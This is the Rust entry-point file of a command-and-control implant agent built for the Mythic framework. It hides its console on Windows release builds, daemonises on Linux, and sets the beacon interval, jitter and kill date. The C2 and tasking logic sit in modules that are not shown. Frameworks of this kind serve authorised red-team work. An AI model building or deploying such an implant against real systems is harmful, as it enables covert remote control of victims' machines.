// Hide console window on Windows release builds.
#![cfg_attr(all(windows, not(debug_assertions)), windows_subsystem = "windows")]

// ── Logging macros (MUST be before mod declarations) ────

/// Print informational messages only in debug builds and only when the
/// DEBUG global is set. Also suppress if the agent has daemonised
/// (no stderr to write to).
#[macro_export]
macro_rules! info {
    ($($arg:tt)*) => {
        #[cfg(debug_assertions)]
        {
            if $crate::DEBUG.load(::core::sync::atomic::Ordering::Relaxed) {
                eprintln!($($arg)*);
            }
        }
    };
}

extern crate alloc;

mod agent;
mod c2;
mod common;
mod config;
mod error;
pub use error::{Error, Result};
mod sys;
mod tasks;

use core::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::cell::RefCell;

const RAW_JSON: &str = include_str!("../config.json");

// ── Global state ────────────────────────────────────────

pub static INTERVAL: AtomicU64 = AtomicU64::new(30);
pub static JITTER: AtomicU64 = AtomicU64::new(0);
pub static SHOULD_EXIT: AtomicBool = AtomicBool::new(false);
pub static EXIT_PROCESS: AtomicBool = AtomicBool::new(false);
pub static KILLDATE: AtomicU64 = AtomicU64::new(0);
pub static DEBUG: AtomicBool = AtomicBool::new(false);

/// Thread-local buffer for handlers that need to emit multiple
/// `TaskResponse`s (e.g. multi-chunk `download`). The agent loop drains this
/// after each `safe_dispatch` and appends to `pending` before the next round.
thread_local! {
    pub static EXTRA_RESPONSES: RefCell<Vec<mythic::TaskResponse>> = const { RefCell::new(Vec::new()) };
}

/// Append a response to the thread-local extras buffer.
pub fn push_extra(resp: mythic::TaskResponse) {
    EXTRA_RESPONSES.with(|cell| cell.borrow_mut().push(resp));
}

/// Drain the extras buffer, returning accumulated responses.
pub fn take_extra() -> Vec<mythic::TaskResponse> {
    EXTRA_RESPONSES.with(|cell| std::mem::take(&mut *cell.borrow_mut()))
}

pub fn set_sleep(interval: u64, jitter: Option<u64>) {
    INTERVAL.store(interval, Ordering::Release);
    if let Some(j) = jitter {
        JITTER.store(j, Ordering::Release);
    }
}

pub fn set_killdate(ts: u64) {
    KILLDATE.store(ts, Ordering::Release);
}

// ── Entry ───────────────────────────────────────────────

fn main() {
    // Linux release: fork to background so the agent doesn't occupy the shell.
    // After fork: detach from controlling terminal (setsid), ignore SIGHUP,
    // close std{in,out,err} and reopen against /dev/null, chdir to root.
    // This ensures no parent fd leaks into the daemonised child.
    #[cfg(all(unix, not(debug_assertions)))]
    unsafe {
        if libc::fork() != 0 {
            return; // parent exits, child continues
        }
        libc::setsid();
        libc::signal(libc::SIGHUP, libc::SIG_IGN);

        // Close stdin/stdout/stderr and reopen against /dev/null.
        // Without this the daemonised agent would still hold fds pointing
        // at the original launcher / terminal.
        let devnull = b"/dev/null\0";
        let fd = libc::open(devnull.as_ptr() as *const _, libc::O_RDWR);
        if fd >= 0 {
            // dup2 onto 0, 1, 2 (don't assume they were 0/1/2 — could be
            // closed already or shifted)
            libc::dup2(fd, 0);
            libc::dup2(fd, 1);
            libc::dup2(fd, 2);
            if fd > 2 {
                libc::close(fd);
            }
        }
        // Detach from cwd of launcher to avoid keeping it busy.
        let _ = libc::chdir(b"/\0".as_ptr() as *const _);
    }

    // Linux debug: still attached to terminal, but ignore SIGHUP.
    #[cfg(all(unix, debug_assertions))]
    unsafe {
        libc::signal(libc::SIGHUP, libc::SIG_IGN);
    }

    let config = config::Config::load_json(RAW_JSON);
    if let Err(e) = agent::run(config) {
        eprintln!("Agent error: {:?}", e);
    }
}
